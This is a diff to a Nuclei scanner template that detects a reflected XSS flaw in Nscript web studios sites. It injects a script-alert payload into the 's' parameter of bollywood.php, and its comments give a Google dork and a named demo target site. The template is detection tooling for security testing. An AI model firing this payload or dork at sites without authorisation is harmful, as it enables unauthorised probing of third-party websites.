@@ -1,8 +1,9 @@
-id: Nscript XSS
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
+id: Nscript-XSS
 
 info:
   name: Nscript web studios XSS vulnerability
-  author: pikpikcu 
+  author: pikpikcu
   severity: medium
   #Category: webapps
   #Google Dork: "Powered by : Nscript web studios"
@@ -10,7 +11,7 @@ info:
   #Software Link: https://nscript.com/portfolio
   #Demo Target: http://apjsingapore.com
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/bollywood.php?s="><script>alert(document.domain)</script>'
